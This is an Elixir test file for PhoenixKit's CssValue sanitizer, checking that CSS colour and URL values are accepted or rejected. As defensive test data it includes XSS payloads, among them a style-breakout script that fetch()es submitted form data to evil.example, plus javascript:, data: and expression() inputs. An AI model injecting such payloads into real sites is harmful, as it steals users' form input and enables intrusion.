defmodule PhoenixKit.Utils.CssValueTest do
  use ExUnit.Case, async: true

  alias PhoenixKit.Utils.CssValue

  doctest PhoenixKit.Utils.CssValue

  describe "color/1 accepts what the background setting is for" do
    test "hex colours of every length" do
      for value <- ~w(#fff #FFF #1e293b #1E293B #1e293bcc) do
        assert CssValue.color(value) == value
      end
    end

    test "colour functions" do
      for value <- [
            "rgb(30, 41, 59)",
            "rgb(30 41 59)",
            "rgba(30, 41, 59, 0.5)",
            "hsl(217, 33%, 17%)",
            "hsla(217, 33%, 17%, .5)"
          ] do
        assert CssValue.color(value) == value
      end
    end

    test "named colours and gradients" do
      assert CssValue.color("rebeccapurple") == "rebeccapurple"

      gradient = "linear-gradient(135deg, #667eea 0%, #764ba2 100%)"
      assert CssValue.color(gradient) == gradient

      radial = "radial-gradient(circle at 50% 50%, #fff, #000)"
      assert CssValue.color(radial) == radial
    end

    test "surrounding whitespace is trimmed rather than rejected" do
      assert CssValue.color("  #1e293b  ") == "#1e293b"
    end
  end

  describe "color/1 refuses anything that could leave the declaration" do
    test "the stored-XSS payload this guard exists for" do
      payload =
        "red; } </style><script>document.addEventListener('submit'," <>
          "e=>fetch('https://evil.example/c?'+new URLSearchParams(new FormData(e.target))))" <>
          "</script><style> .x {"

      assert CssValue.color(payload) == ""
    end

    test "each structural character on its own" do
      for value <- [
            "red;",
            "red}",
            "red{",
            "red<",
            "red>",
            "red\"",
            "red'",
            "red\\",
            "red/*comment*/",
            "red\nblue"
          ] do
        assert CssValue.color(value) == "", "expected #{inspect(value)} to be refused"
      end
    end

    test "constructs that reach the network or an evaluator" do
      # These two are refused by the charset alone (`:` and `/`), so they do not
      # exercise @color_forbidden — kept because they are the realistic spelling.
      assert CssValue.color("url(https://evil.example/x)") == ""
      assert CssValue.color("URL (https://evil.example/x)") == ""

      # These do: every character is inside the allowed charset, so only the
      # forbidden-construct pattern can reject them. Without it the first two
      # would still pass and this test would still be green — which is why they
      # are here.
      assert CssValue.color("url(x)") == ""
      assert CssValue.color("URL (x)") == ""
      assert CssValue.color("expression(alert(1))") == ""
    end

    test "empty, over-long and non-binary input" do
      assert CssValue.color("") == ""
      assert CssValue.color("   ") == ""
      assert CssValue.color(String.duplicate("a", 257)) == ""
      assert CssValue.color(nil) == ""
      assert CssValue.color(123) == ""
    end
  end

  describe "url/1" do
    test "accepts rooted paths and http(s) URLs" do
      assert CssValue.url("/file/018e/original/ab12") == "/file/018e/original/ab12"

      assert CssValue.url("https://cdn.example.com/bg.png?v=2") ==
               "https://cdn.example.com/bg.png?v=2"

      assert CssValue.url("http://cdn.example.com/bg.png") == "http://cdn.example.com/bg.png"
    end

    test "refuses anything that can terminate the url() token or the element" do
      assert CssValue.url("/x'); } </style><script>alert(1)</script>") == ""
      assert CssValue.url("/x\"") == ""
      assert CssValue.url("/x)") == ""
      assert CssValue.url("/x y") == ""
    end

    test "refuses schemes and shapes that leave the origin implicitly" do
      assert CssValue.url("javascript:alert(1)") == ""
      assert CssValue.url("data:text/html,<script>alert(1)</script>") == ""
      assert CssValue.url("//evil.example/bg.png") == ""
      assert CssValue.url("bg.png") == ""
    end

    test "empty and non-binary input" do
      assert CssValue.url("") == ""
      assert CssValue.url(nil) == ""
    end
  end
end
